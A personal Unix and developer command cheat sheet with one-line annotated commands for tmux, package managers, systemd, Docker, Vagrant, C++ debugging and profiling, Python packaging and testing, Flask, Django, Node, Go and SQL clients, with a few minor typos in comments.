[screen] C-a d             # detach
tmux                       # start virtual terminal
tmux new -s NAME           # start virtual terminal named NAME
tmux attach                # attach
tmux a                     # attach
tmux a -t NAME             # attach to NAME
tmux ls                    # list sessions
tmux kill-session -t NAME  # kill session NAME
[tmux] C-b d               # detach
[tmux] C-b 0               # select window 0
[tmux] C-b n               # next window
[tmux] C-b p               # previous window

# Shared virtual terminal
alice@alicehost> ssh SERVER
bob@bobhost    > ssh SERVER
alice@SERVER   > tmux new -s shared
bob@SERVER     > tmux attach -t shared

# Meta commands
watch CMD                  # run CMD over and over
watch -n0.5 CMD            # run CMD every 0.5s
tail -f FILE               # watch file for appends
...|xargs CMD              # run CMD on all lines of input, all at once
...|xargs -n1 CMD          # run CMD on each line of input, one at a time
...|xargs -n1 emacs        # launch emacs one at a time for several files
...|xargs -n1 realpath | xargs -n1 emacs  # ^^^ handle relative file paths
...|xargs -n10 CMD         # process files in batches on 10
...|xargs -o emacs         # Reopen stdin, useful for interactive app (BSD)
...|xargs sh -c 'emacs "$@" < /dev/tty' emacs  # ^^^ BSD and GNU

# Change a bunch of file extensions
ls *.txt | sed 'p;s/.C$/.cpp/' | xargs -L2 mv -v

# Change a bunch of files to filenames based on their sha1sum
sha1sum *.jpg | awk '{print $2 " " $1 ".jpg"}' | xargs -L1 cp -v

# Cron
crontab -l                              # display current crontab
crontab -r                              # remove current crontab
crontab -e                              # edit current crontab
/etc/cron.d/                            # cron configs picked up automatically
/etc/crontab format:
 +---------------- minute (0 - 59)
 |  +------------- hour (0 - 23)
 |  |  +---------- day of month (1 - 31)
 |  |  |  +------- month (1 - 12)
 |  |  |  |  +---- day of week (0 - 6) (Sunday=0 or 7)
 |  |  |  |  |
 *  *  *  *  *  command to be executed

# Log Rotate
logrotate --debug                       # dry run with verbose print
logrotate --force FILE.conf             # force a rotation
/etc/logrotate.d/                       # app-specific configuration goes here
/etc/cron.daily/logrotate               # logrotate scheduled by cron

# LaTeX
detex FILE.tex                          # Remove LaTeX markup
detex FILE.tex | sed -r 's/ *& */,/g'   # LaTeX table to CSV

# Randomness
shuf                                    # shuffle lines
shuf -i 1-100 -n 1                      # Random number between [1, 100]
dd bs=1M count=1 if=/dev/urandom of=FILE# create a 1M file with random content
echo "USER:`openssl rand -base64 32 | head -c32`" | chpasswd  # ^^^ and set it
pwgen 16                                # Random string, 16 chars
pwgen -y                                # ^^^ with punctuation
cat /dev/urandom|tr -dc A-Za-z0-9|head -c16  # Random string, 16 chars
openssl rand -base64 16                 # Random string, 16 chars


########################################
# Windows / Cygwin

# open a file as if you double-clicked it
cygstart.exe FILE


########################################
# OSX
open FILE                               # open a file, same as double-click
open -a "Google Chrome" FILE            # open a file with Firefox
open -a firefox -n                      # Firefox new window
open -a firefox -n --args --private-window # Firefox new private window
pbcopy < FILE                           # copy contents of FILE to clipboard
echo | pbcopy                           # command output -> clipboard
opendiff FILE1 FILE2 [-merge FILE3]     # graphical diff
diskutil unmount /Volumes/USB_DISK      # Unmount USB_DISK
rm ~/.Trash/*                           # Empty trash
dseditgroup -o create -u USER -p GROUP  # create GROUP
dseditgroup -o edit -u USER1 -p -a USER2 -t user GROUP # Add USER2 to GROUP

# Upgrade procedure
# Do this on primary laptop, backup laptop, and desktop
brew update
brew upgrade
brew cleanup
pip3 install --upgrade pip setuptools wheel
softwareupdate --list
softwareupdate -i -a
cd ~ && git fetch -p && git rebase      # update Git-controlled dot files
backup                                  # primary laptop only

# Wifi management
ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/sbin
networksetup -listallhardwareports      # Find network inferface name
networksetup -setairportpower en0 on    # Turn on wifi
airport -s                              # Scan wireless networks
networksetup -setairportnetwork en0 SSID PASSWORD # Connect to wifi network
airport -I                              # Print current wireless status
networksetup -listnetworkserviceorder   # priority of NICs

# Create bootable live USB
# ref: http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-mac-osx
hdiutil convert -format UDRW -o target.img SOURCE.iso
mv target.img.dmg target.img
diskutil list
diskutil unmountDisk /dev/diskN
sudo dd if=./target.img of=/dev/rdiskN bs=1M # change 1M->1m for
diskutil eject /dev/diskN

# Get rid of annoying "damaged and can't be opened" message for downloads
xattr -r -d com.apple.quarantine /Users/awdeorio/mnt/finance

# Homebrew (OSX)
brew install PACKAGE                    # install PACKAGE
brew uninstall PACKAGE                  # remove PACKAGE
brew update                             # update package index
brew upgrade                            # upgrade installed packages
brew cleanup                            # remove tarballs, installers, etc.
brew list                               # list installed casks and formulae
brew outdated                           # list outdated packages
brew update                             # update package index (includes cask)
brew linkapps                           # link to /Applications/
brew uses --installed                   # reverse dependency lookup
brew shellenv                           # list suggested environment variables

# Services
brew services list                      # list startup services
brew services run SERVICES              # Start w/o register launch at login
brew services start SERVICE             # Start and register launch at login
brew services stop SERVICE              # Stop and unregister launch at login
brew services restart SERVICE           # Restart and register launch at login
brew services restart -v -d SERVICE     # ^^^ with more info
launchctl unload  /System/Library/LaunchDaemons/ssh.plist  # stop SSH server
launchctl load  /System/Library/LaunchDaemons/ssh.plist    # start SSH server

########################################
# Linux Distro or Package Specifics

# What distro is this?
lsb_release                             # print distribution information
lsb_release -a                          # print distribution information
cat /etc/lsb_release                    # print distribution information

# emerge (Gentoo)
/usr/portage/profiles/use.desc
/usr/portage/profiles/use.local.desc

# rpm (RedHat and derivatives)
rpm -vh                                 # verbose, print hash-mark progress bar
rpm -ivh PACKAGE.rpm                    # install
rpm -Uvh PACKAGE.rpm                    # upgrade
rpm -Uvh --replacepkgs PACKAGE.rpm      # reinstall
rpm -ev PACKAGE                         # uninstall
rpm --replacefiles                      # allow overwriting config files
rpm --force                             # replace files and packages
rpm -q PACKAGE                          # check if PACKAGE is installed
rpm2cpio FILE.rpm | cpio -idmv          # extract files from rpm
rpmbuild -bp                            # %prep
rpmbuild -bc                            # %prep, %build
rpmbuild -bi                            # %prep, %build, %install
rpmbuild -bl                            # Make sure all %files exist
rpmbuild -ba                            # Build binary and source packages
rpmbuild -bs                            # Build only source package
rpmbuild -bb                            # Build only binary package
tar -tvf RPMFILE                        # List rpm contents
tar -xvf RPMFILE                        # Unpack rpm contents

# yum (RedHat and derivatives)
yum update                              # Update repository
yum search PACKAGE                      # Search for PACKAGE
yum install PACKAGE                     # Install PACKAGE system-wide
yum install yum-utils                   # Install dev tools, step 1
yum groupinstall development            # Install dev tools, step 2
yum install epel-release                # Extra Packages for Enterprise Linux
yum list installed                      # Show installed packages
yum repolist                            # Show enabled package repos
yum repolist -v                         # Show all package repos
yum -y                                  # Assume "yes" and don't ask

# SELinux
# https://wiki.centos.org/HowTos/SELinux
sestatus                                # Show status and policy
tail /var/log/audit/audit.log           # See permission denials
setsebool -P httpd_can_network_connect 1# Allow HTTP daemon connect to network
yum install attr                        # Install getfattr
getfattr -m security.selinux -d FILE    # Show extended attributes of a file
ls -Z FILE                              # Show extended attributes of a file
chcon -v --type=httpd_sys_content_t     # Give web server access to a dir
chcon -Rv --type=httpd_sys_content_t    # Give web server access to a dir+files

# apt (Debian-based systems)
apt-get install                         # install package
apt-get remove                          # remove package
apt-get purge                           # remove package and config files
apt-get update                          # update repository
apt-get upgrade                         # upgrade packages, but NOT kernel
apt-get autoremove                      # remove unused package deps
apt-get dist-upgrade                    # upgrade packages, including kernel
apt-get download PACKAGE                # download .deb
apt-cache search PACKAGE                # find packages
apt-cache show PACKAGE                  # get the details on a package
dpkg --get-selections | grep -v deinstall # list installed packages
dpkg --get-selections | grep PACKAGE    # see if package is installed
dpkg -i PACKAGE.deb                     # Install

# apt vs. apt-get and apt-cache
apt install                             # AKA apt-get install
apt remove                              # AKA apt-get remove
apt purge                               # AKA	apt-get purge
apt update                              # AKA aapt-get update
apt upgrade                             # AKA apt-get upgrade
apt autoremove                          # AKA apt-get autoremove
apt full-upgrade                        # AKA apt-get dist-upgrade
apt search                              # AKA apt-cache search
apt show                                # AKA apt-cache show
apt list                                # List installed, upgradable etc
apt edit-sources                        # Modify package repos

# How to take apart a .deb file
mkdir tmp && cd tmp
ar x ../FILE.deb
tar -xvzf control.tar.gz
tar -xvzf data.tar.xz

# Upstart
initctl reload-configuration            # reload configs in /etc/init/
service MYSERVICE status                # status of service
status MYSERVICE                        # status of service
service MYSERVICE start                 # start service
start MYSERVICE                         # start service
service MYSERVICE stop                  # stop service
stop MYSERVICE                          # stop service
service MYSERVICE restart               # restart service
restart MYSERVICE                       # restart service
init-checkconf /etc/init/MYSERVICE.conf # check config syntax
initctl reload-configuration            # update config (default auto updates)
sudo initctl log-priority debug         # enable debugging
initctl emit EVENT                      # manually emit an event

# Systemd
systemctl start SERVICE                 # start
systemctl stop SERVICE                  # stop
systemctl status SERVICE                # status
systemctl is-active --quiet service     # status, from a script
systemctl reload SERVICE                # reload config
systemctl restart SERVICE               # restart
systemctl enable SERVICE                # start on boot
systemctl disable SERVICE               # don't start on boot
/etc/system/systemd/                    # config file location
systemctl daemon-reload                 # restart after add or modifying config
journalctl                              # view logs
journalctl -b                           # view logs since most recent reboot
journalctl -n                           # view last 10 logs
journalctl -f                           # follow log
journalctl -u nginx.service             # view logs from nginx service
journalclt --no-pager                   # output for piping
journalctl -o json                      # output in JSON format
journalctl -o json-pretty               # output in JSON format

# Nginx
nginx -t                                # Check syntax of nginx config

# RabbitMQ
rabbitmqctl list_users                  # list users
rabbitmqctl list_permissions            # list permissions for all users
rabbitmqctl list_user_permissions USER  # list permissions for one user
rabbitmqctl add_user USER PASSWD        # add a user
rabbitmqctl delete_user USER            # remove a user
rabbitmqctl set_user_tags USER administrator  # make USER an admin

# VirtualBox
vboxmanage list vms                     # list virtual machines
vboxmanage list runningvms              # list running virtual machines
vboxmanage startvm NAME                 # start NAME virtual machine
vboxmanage startvm NAME --type headless # start, headless mode
vboxmanage controlvm NAME poweroff      # pull plug
vboxmanage controlvm NAME acpipowerbutton # halt
vboxmanage unregistervm NAME --delete   # remove
vboxmanage import FILE.ova              # import OVA
vboxmanage import FILE.ova --dry-run    # ^^^ just print
vboxmanage list bridgedifs              # list NICS available for bridging
vboxmanage modifyvm "VM Name" --bridgeadapter1 "nic name" # change bridged NIC

# Modifying OVA virtual appliances
tar -xvf vmName.ova                     # untar appliance
$EDITOR vmName.ovf                      # edit config
sha1sum vmName.ovf                      # compute new hash of config
$EDITOR vmName.mf                       # replace old hash with new hash
tar -cvf vmName-NEW.ova vmName{.ovf,-disk1.vmdk,.mf} # repackage

# Vagrant
# https://www.vagrantup.com/
vagrant init                            # create new configuration Vagrantfile
vagrant init bento/ubuntu-14.04         # create Vagrantfile for Ubuntu 14.04
vagrant init bento/ubuntu-16.04         # create Vagrantfile for Ubuntu 16.04
vagrant init bento/ubuntu-18.04         # create Vagrantfile for Ubuntu 18.04
vagrant init bento/ubuntu-20.04         # create Vagrantfile for Ubuntu 20.04
vagrant init centos/7                   # create Vagrantfile for Centos 7
vagrant init fedora/30-cloud-base       # create Vagrantfile for Fedora
vagrant up                              # boot VM, create if necessary
vagrant up --no-provision               # create VM, but don't isntall anything
vagrant up --provision                  # boot VM, force installers to run
vagrant ssh                             # connect to VM
 > cd /vagrant/                         # shared directory w/host OS
vagrant ssh-config                      # list SSH configuration
vagrant halt                            # halt VM
vagrant reload                          # reboot VM
vagrant global-status                   # all VMs on this machine
vagrant global-status --prune           # remove machines whose configs are gone
VAGRANT_VAGRANTFILE=Vagrantfile2        # alternate Vagrantfile
VAGRANT_DOTFILE_PATH=/path/to/.vagrant  # useful together with ^^^

# Docker Server on macOS
brew cask install docker                # Install
open /Applications/Docker.app           # Start VM
docker version                          # Verify connection

# Docker Server on Linux
sudo systemctl start docker             # Start service
systemctl status docker                 # Status service
sudo systemctl stop docker              # Stop server

# Docker
docker ps                               # Show running containers
docker run jameslp/eecs485:19           # Run container, download if needed
docker run -it                          # Run interactive with pseudo-TTY
docker run -d
docker run --rm
docker cp FILE CONTAINER:DEST           # Copy from host into running container
docker exec CONTAINER CMD               # Run CMD in running container
docker attach $CONTAINER                # Attach terminal to running container
docker images                           # List available images
docker images -a                        # List all images
docker system prune                     # Remove dangling images
docker system prune -a                  # Remove stopped images
docker build .                          # Build image
docker build . -t TAG                   # Build image and name it
docker build -t foo . && docker run -it foo  # Quick start build-and-run
docker login                            # Test connection to DockerHub

# Docker: install Linux VM on macOS (deprecated)
brew install docker docker-machine      # Install
brew cask install virtualbox            # Install
docker-machine create --driver virtualbox default  # Create Linux VM
docker-machine start                    # Start Linux VM
docker-machine status [default]         # Status of Linux VM
docker-machine ls                       # Show Docker VMs
docker-machine env default              # Show Docker environment variables
eval "$(docker-machine env default)"    # Set Docker environment variables
docker run hello-world                  # Run sanity check docker machine
docker-machine stop default             # Stop Linux VM

# Docker: install on Ubuntu
# https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-18-04
apt update
apt install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
apt update
sudo usermod -aG docker ${USER}
docker run hello-world

# Environment Modules
# http://modules.sourceforge.net/
module load vscode                      # add software to PATH
module load vscode/1.19.2               # add specific SW version to PATH
module unload vscode                    # remove software from PATH
module switch vscode/1.19.2             # change version
module list                             # show loaded modules
module clear                            # clear all loaded modules
module apropos                          # search module name and description
module avail -t 2>&1 | grep vscode      # search module name (deprecated)
module key vscode                       # search module name

# C++ compilation
gcc -Wall -Werror -std=c89 -ansi        # compile ISO C
g++ -Wall -Werror -pedantic             # compile ISO C++
g++ -Wall -Werror -pedantic -std=c++11  # compile ISO C++11
g++ -g                                  # compile with debug support
g++ -Wfatal-errors                      # stop after one error
g++ -E FILE.cpp -o FILE.ii              # stop after preprocessing
g++ -S FILE.ii -o FILE.s                # stop after compilation proper
g++ -c FILE.s -o FILE.o                 # stop after assembling
g++ FILE.o -o FILE                      # stop after linking (all done!)
echo $LD_LIBRARY_PATH                   # run time library resolution
echo $LIBARY_PATH                       # gcc static library search path, gcc -L
echo $LD_RUN_PATH                       # gcc link time library resolution
echo $CPATH                             # gcc search path, gcc -I
echo $C_INCLUDE_PATH                    # ^^^ for C
echo $CPLUS_INCLUDE_PATH                # ^^^ for C++
ldd EXE                                 # show dynamically loaded libraries

# Debug with gdb
g++ -g                                  # compile
gdb ./a.out                             # run
gdb -tui ./a.out                        # run, "CLI-based" GUI

# Debug with lldb
# Cheat sheet https://lldb.llvm.org/lldb-gdb.html
g++ --version                           # verify that g++ is really clang
g++ -g                                  # compile
lldb ./a.out                            # run

# Dynamic analysis with valgrind
valgrind -v ./a.out                     # Check for undefined behavior
valgrind -v --leak-check=full ./a.out   # Check for memory leaks
valgrind --tool=callgrind ./a.out       # Instruction count
valgrind --tool=callgrind --simulate-cache=yes  # Instruction count w/ cache
callgrind_annotate callgrind.out.12345  # Instruction count summary
valgrind --tool=massif ./a.out          # Memory consumption
valgrind --tool=massif --stacks=yes ./a.out  # Memory consumption w/ stack
ms_print massif.out.12345               # Memory consumption summary
# Dynamic analysis with address sanitizer (ASAN)
clang++ -fsanitize=address              # Compile (OSX)
g++ -fsanitize=address                  # Compile (GNU)
./a.out                                 # Run
ASAN_OPTIONS=help=1 ./a.out             # Help
ASAN_OPTIONS=verbosity=2 ./a.out        # Verbose

# Dynamic analysis (leak checking) with macOS leaks
leaks -quiet -atExit -- ./a.out

# Dynamic analysis with bounds checking (GNU GCC only)
g++ -D_GLIBCXX_DEBUG                    # Compile
./a.out                                 # Run

# Static analysis
pmd cpd --language cpp --minimum-tokens 50 --files *.cpp  # code duplication
oclint *.cpp                            # style
cppcheck *.cpp                          # undefined behavior checks

# Profile with gprof
g++ -pg                                 # compile
gprof ./a.out gmon.out > analysis.txt     # analyze

# Profile with perf
# TODO: https://jvns.ca/debugging-zine.pdf
g++ -g                                  # compile
perf record -g ./a.out                  # run
perf report                             # analyze

# Coverage with gcov
# To measure coverage of a suite of unit and system tests, be sure to compile
# using the separate compilation model.
g++ --version                           # verify that g++ is GNU, not clang
g++ -g --coverage FILE.cpp              # compile
./a.out                                 # run
gcov FILE.cpp                           # analyze
grep '^#####' test.cpp.gcov             # show lines that didn't execute

# GNU Make
make                                    # Build the first target in Makefile
make -f FILE                            # Use FILE as Makefile
make -d                                 # Print debugging information
make -jN                                # Run N parallel jobs
make -k                                 # Keep going after error, if possible
make -n                                 # Dry run
make -r                                 # Eliminate built-in implicit rules

# Binary tools
# OSX: brew install binutils; then use gobjdump
strings FILE                            # find printable strings in an object
objdump -D file.o                       # disassemble
hexdump                                 # binary -> hex (check endianness!)
xxd                                     # binary -> hex (check endianness!)

# LastPass CLI
brew install lastpass-cli --with-pinentry  # install (OSX)
lpass login awdeorio@gmail.com          # start agent
lpass logout                            # stop agent
lpass status                            # check agent
lpass ls                                # list saved passwords
lpass show amazon.com                   # show one saved password
lpass show --password amazon.com --clip # copy one password to clipboard
lpass show -p amazon.com -c             # copy one password to clipboard
lpass export                            # dump to plain text CSV
lpass edit amazon.com                   # edit entry using $EDITOR
encfs --extpass 'lpass show ID --password' # LastPass + encfs

# JSON
echo '{"json":"obj"}' | python -m json.tool    # Pretty-print
echo '{"json":"obj"}' | jq                     # Pretty-print
echo '{"json":"obj"}' | jsonlint               # Lint
jq '.'                                  # Identity filter
jq '.results'                           # Filter value from key "results"
jq '."results"[]["name"]'               # Filter nested values from a list
python -c 'import sys, json; print json.load(sys.stdin)["results"]'  # ^^^

# XML
cat FILE.xml | python2 -c 'import sys;import xml.dom.minidom;s=sys.stdin.read();print xml.dom.minidom.parseString(s).toprettyxml()'  # Pretty print
cat FILE.xml | xmlstarlet format        # Pretty print

# HTML
tidy FILE.html  # Pretty print HTML


########################################
# Java
java -jar myprog.jar                    # run a java program
jar -xvf                                # extract all files from jar archive


########################################
# Perl
cat FILE | perl -pe 's///'              # apply line of Perl to each input line
perl -V                                 # debug environment
PERL5LIB                                # environment variable for tool installs
cpan -i PACKAGE                         # install package
perl -pe 's/\\\\n/ /'                   # remove continuation lines (backslash)
perl -0pe 's/QUERY/REPLACE/sm'          # multiline regex query-replace
perl -i -pe                             # edit in place (like sed -i)


########################################
# Python

# Options
python -m MODULE                        # load module and execute main()
python -c "CODE"                        # execute CODE
python -m site                          # Display configuration

# Search path for libraries
echo $PYTHONPATH                        # Python library search path
echo $PYTHONUSERBASE                    # Base dir, e.g., ${HOME}/.local
echo $PYTHONSTARTUP                     # Interactive interpreter startup
python -c 'import sys; print("\n".join(sys.path))'

# Python install
apt-get install python3 python3-pip python3-venv python3-wheel python3-setuptools  # Linux
brew install python3                    # MacOS

# Anaconda Python
# https://docs.anaconda.com/anaconda/install/uninstall/
~/anaconda3/bin/conda init              # Permanently activate
conda init --reverse                    # Permanently deactivate
conda deactivate                        # Temporarily deactivate

# Python virtual environment
virtualenv venv                         # create, Python2
python3 -m venv .venv                   # create, Python3
source ./venv/bin/activate              # enable, bash
. ./venv/bin/activate                   # enable, csh, etc.
deactivate                              # disable

# Python pip
pip install PACKAGE                     # install Python package
pip install --upgrade PACKAGE           # upgrade Python package
pip install -e .                        # install local Python package for dev
pip install --upgrade --upgrade-strategy=eager -e .  # upgrade setup.py
pip install --user PACKAGE              # install to ~/.local/
pip list                                # list install packages
pip freeze                              # ^^^ in requirements format
pip freeze --exclude-editable           # ^^^ excluding editable package

# Python pipenv
# Docs: https://docs.pipenv.org/  http://docs.pipenv.org/advanced/
pip3 install pipenv                     # System-wide pipenv install
pipenv --where                          # Output project home path
pipenv --venv                           # Output project virtual env path
pipenv --three                          # Create virtual environment, Pipfile
PIPENV_VENV_IN_PROJECT pipenv --three   # ^^^ inside $(pwd)/.venv/
pipenv install PACKAGE                  # Install PACKAGE into venv
pipenv uninstall PACKAGE                # Remove PACKAGE from venv
pipenv shell                            # Activate virtual environment
pipenv run CMD                          # Run CMD in virtual environment

# Python pyenv
pyenv versions                          # List installed versions
pyenv install --list                    # List versions available for install
pyenv install 3.6.6                     # Install Python-3.6.6
pyenv shell 3.6.6                       # Set 3.6.6 as default python temp
pyenv global 3.6.6                      # Set 3.6.6 as global python version
pyenv root                              # Location of local Python installs
eval "$(pyenv init -)"                  # Activate pyenv in bashrc

# Python debugging with pdb
>>> import pdb; pdb.set_trace();        # Break, enter debug shell
>>> breakpoint()                        # Break, enter debug shell (Python3)
python -m pdb script.py                 # Break at beginning of program
>>> pdb.Pdb(skip=['django.*']).set_trace()  # Do not step into library code

# Python debugging with pdbpp https://pypi.python.org/pypi/pdbpp/
$ pip install pdbpp
>>> import pdb; pdb.set_trace()         # Break, enter debug shell
> sticky                                # Show code listing with shell prompt
> pp OBJECT                             # pretty-print OBJECT

# Python debugging with pdb inside Emacs
M-x pdb
Run pdb (like this): python3 -m pdb FILE.py

# Python style
pycodestyle                             # PEP8 check
pydocstyle                              # PEP257 check
pylint                                  # Bug and quality check
pylint --output-format colorized        # Colored output

# Python unittest
python -m unittest MODULE               # Run all tests in MODULE
python -m unittest MODULE.CLASS         # Run all tests in CLASS
python -m unittest MODULE.CLASS.FXN     # Run one test function

# Python pytest
python -m pytest                        # Run all tests
pytest                                  # Run all tests
pytest FILE::FXN                        # Run one test function
pytest FILE::CLASS::FXN                 # Run one test member function
pytest --pdb                            # Drop to pdb after a failure
pytest --trace                          # Drop to pdb at beginning of test
pytest -x                               # Exit on first error
pytest -s                               # Do not capture stdout
pytest --runxfail                       # Run tests marked as expected failures
pytest --last-failed                    # Rerun only tests that failed last run
pytest --showlocals                     # Dump local variables for debugging
pytest --reuse-db                       # Reuse test DB
pytest --create-db                      # Re-create test DB
pytest -vvsx                            # Verbose, show stdout, stop on error
pytest --log-cli-level=INFO             # Change log level
pytest -p no:logging                    # Override log level, e.g. in pytest.ini
pytest --tb=line                        # Less output from many failures
pytest --collect-only --verbosity=-1    # List test names
pytest --cov MODULE                     # Measure coverage with pytest-cov
pytest --cov --cov-report term-missing  # ^^^ show line nos missed by tests
coverage annotate                       # Create *.py,cover showing LOC coverage

# Python tox CLI
tox                                     # Run all tests
tox -e py3                              # Run one test environment
tox -vv                                 # Show debug info

# Python Source Distributions
python setup.py sdist                   # Create dist in ./dist/

# Quick web server serving files in PWD on port 8000
python2 -m SimpleHTTPServer
python3 -m http.server

# Python dead code search
vulture PATH


########################################
# Python / IPython
# AKA Jupyter Notebook, `ipdb`, or Django's `manage.py shell`

# Execute a Jupyter Notebook in headless mode.  Clears all output, runs the
# entire notebook, and writes the result to an output .ipynb file
# NOTE: `ipython nbconvert` is buggy and incorrectly times out long jobs
pip install runipy
runipy -o NOTEBOOK.ipynb

# Jupyter Notebook server on a remote server
jupyter-notebook --ip 0.0.0.0 --no-browser

# Jupyter Notebook on a remote server behind a firewall (local port forwarding)
remotehost> jupyter-notebook
localhost > ssh -vnNTL 8888:localhost:8888 $REMOTEHOST
localhost > open http://localhost:8888

# Jupyter Notebook cell magic
%load_ext autoreload                    # Automatically reload source code now
%autoreload 2                           # ^^^ every time before executing code


####################
# PyPI howto
#
# https://packaging.python.org/tutorials/packaging-projects/
#
# This example is for mailmerge https://github.com/awdeorio/mailmerge

# Clean up
git fetch
git switch develop
git rebase
git clean -xdf
git status

# Test
tox

# Edit setup.py and change the version
$EDITOR setup.py
git commit -m "version bump" setup.py
git push origin develop

# Merge develop to main
git switch main
git rebase
git merge --no-ff origin/develop

# Build distribution binary and source tarball locally
python3 -m venv .venv
source .venv/bin/activate
pip3 install --upgrade pip setuptools wheel
python3 setup.py sdist bdist_wheel
ls dist/

# Tag a release and double check that the versions match
git tag -a X.Y.Z
grep version= setup.py
git describe
git push --tags origin main

# Deploy to Test PyPI and browse to https://test.pypi.org/project/mailmerge/
twine upload --sign --repository-url https://test.pypi.org/legacy/ dist/*

# Test install.  It will install, but not run because we didn't install deps.
python3 -m venv envtmp
source envtmp/bin/activate
pip install --index-url https://test.pypi.org/simple/ --no-deps mailmerge
mailmerge --version  # Expect module not found error
deactivate

# Deploy to PyPI and browse to https://pypi.org/project/mailmerge/
twine upload --sign dist/*

# Test deploy
pip3 install --upgrade mailmerge
mailmerge --version

# Draft a new release on GitHub
https://github.com/awdeorio/mailmerge/tags


########################################
# Python / Flask

# Flask command line utility
pip install flask                       # Install
export FLASK_ENV=development            # Debug mode
export FLASK_APP=insta485               # Configure application name
flask routes                            # Show the routes for the app
flask shell                             # Run a shell in the app context
flask run                               # Run a development server
flask run --host 0.0.0.0 --port 8000    # ^^^ specify host and port

# Run a development server
export FLASK_ENV=development
export FLASK_APP=insta485
flask shell


########################################
# Python / Django
# Ref: https://docs.djangoproject.com/en/1.11/intro/tutorial01/
pip install django                      # install
brew install django-completion          # bash completion for django (OSX)
python -m django --version              # check version
django-admin startproject MYSITE        # create site, including manage.py
./manage.py runserver                   # development server
./manage.py runserver 8080              # development server, alternate port
./manage.py runserver 0:8000            # development server, externally visible
./manage.py startapp MYAPP              # create app (project has multiple apps)
./manage.py migrate                     # DB migration.  Creates db tables.
./manage.py makemigrations MYAPP        # create DB migration scripts
./manage.py makemigrations -n NAME      # ^^^ with a name
cat MYAPP/migrations/0001_initial.py    # check out migration script
./manage.py sqlmigrate polls 0001       # check out SQL migrate would run
./manage.py check                       # migration dry run
./manage.py migrate                     # perform migration w/ any new scripts
./manage.py shell                       # python shell with Django environment
./manage.py createsuperuser             # create admin user for (w/ web login)
./manage.py loaddata FILE               # Load database from JSON FILE
./manage.py dumpdata                    # Dump database to JSON
./manage.py dumpdata APP                # ^^^ for single APP
./manage.py dumpdata APP.MODEL          # ^^^ for single model

# Django debugging
>>> pdb.Pdb(skip=['django.*']).set_trace()  # Do not step into django code

# Django REST Framework Debug URL Routing
# http://www.django-rest-framework.org/api-guide/routers/#defaultrouter
./manage.py shell
from django.urls import reverse
reverse("api:connectortask-detail", args=[1])


########################################
# JavaScript / Node

# Python + JS Virtual Environments
python3 -m venv env                     # create virtual environment
source env/bin/activate                 # activate virtual environment
pip install PACKAGE                     # install Python packages
pip install nodeenv                     # install node virtual env utility
nodeenv --python-virtualenv             # install local node and npm
npm install --global webpack            # install global JS packages
ls env/lib/node_modules/                # location of global JS packages
npm install .                           # install local JS package
npx PACKAGE                             # run PACKAGE command line tool
webpack                                 # build front end
webpack --watch                         # continuously build front end
webpack --display-error-details         # debug frontend build
npm install -g uglify-js                # install uglifyjs
uglifyjs --beautify FILE.js             # pretty print JavaScript

# npm
npm install --save-prod PACKAGE         # Install and add to package.json (prod)
npm install --save-dev PACKAGE          # Install and add to package.json (dev)
npm update PACKAGE --save               # Upgrade one package
npm list PACKAGE                        # Check if PACKAGE is installed

# Update all dependencies in package.json
npm install --global npm-check-updates
npm-check-updates --upgrade
npm-check-updates --upgradeAll
npm install .

# node
NODE_DEBUG='*' node test.js             # Enable all debug messages
NODE_DEBUG=timer node test.js           # Enable only timer debug messages
node --trace-events-enabled --trace-event-categories node.async_hooks --trace-event-file-pattern log.json test.js  # VERY detailed debug info

# fetch() in node
npm install node-fetch                  # Install node-fetch
const fetch = require("node-fetch");    # Import node-fetch in your program

# Lint
npx eslint --env-info
npx eslint PATH
npx prettier --support-info
npx prettier --check PATH  # Check
npx prettier --write PATH  # Fix


########################################
# GoLang

$ export GOPATH=${HOME}/.go             # Set Go library install root
$ export PATH=${PATH}:${GOPATH}/bin     # Add Go utilities to PATH
$ go env GOPATH                         # Get Go library install root
$ go env                                # List all Go environment variables
$ go get -v .                           # Install dependencies
$ go test -v                            # Run all unit tests
$ go test -run TESTNAME                 # Run one unit test
$ go get golang.org/x/tools/cmd/...     # Install godoc et al.
$ go get -v -u golang.org/x/lint/golint # Install golint
$ go get -u github.com/nsf/gocode       # Install gocode
$ go get -v github.com/rogpeppe/godef   # Install godef
$ go get -u github.com/derekparker/delve/cmd/dlv  # Install dlv
$ godoc -http=:6060                     # Render package docs
$ open http://localhost:6060/pkg/github.com/USERNAME/PACKGE/  # See package docs

########################################
# Ruby

$GEM_HOME                               # Ruby library install root
gem env                                 # sanity check gem paths
gem install PACKAGE                     # Install PACKAGE
gem update --system                     # Upgrade installed packages
gem cleanup                             # Remove old versions
gem list                                # List installed packages
gem outdated                            # List installed and outdated packages


########################################
# SQL

# sqlite3 Linux CLI
sqlite3 file.db                         # open connection to database from file
sqlite3> .databases                     # list the databases
sqlite3> .tables                        # list the tables
sqlite3> .schema                        # show the table creation commands
sqlite3> .headers on                    # print table column names
sqlite3> .mode column                   # pretty print table columns
sqlite3> .show                          # print settings
sqlite3> PRAGMA foreign_keys;           # check if foreign keys enabled
sqlite3> PRAGMA foreign_keys = ON;      # enable foreign keys (CASCADE, etc)

# sqlite3 dump to CSV (2 ways)
sqlite3 -header -csv FILE.db < query.sql > dump.csv
sqlite3 FILE.db
sqlite3> .headers on
sqlite3> .mode csv
sqlite3> .output dump.csv
sqlite3> SELECT * FROM table;

# sqlite3 load from CSV
echo -ne '.mode csv\n.import FILE.csv DB_NAME\n' | sqlite3 FILE.db
sqlite3 FILE.db
sqlite3> .mode csv
sqlite3> .import FILE.csv

# MySQL Linux CLI
mysql.server start                      # start SQL server
mysqladmin -u root password PASSWORD    # change root password
mysql -u root                           # connect, no password
mysql -u root -pPASSWORD                # connect, w/password, NO SPACE
mysql -u root -p                        # connect, prompt password
mysql -u user -p DB                     # connect and open DB
mysql -u user -p < SCRIPT               # run script
mysqldump -u user -pPASSWD DB > file.db # dump database to file
mysql -u [user] db < FILE.sql           # restore db from file
mysql -e 'SHOW DATABASES'               # run SQL at the CLI
mysqldump --add-drop-table \            # copy DB from localhost to HOST
  --extended-insert --force \
  --log-error=error.log -uUSER -pPASS \
  OLD_DB_NAME | ssh -C HOST \
  "mysql -uUSER -pPASS NEW_DB_NAME"
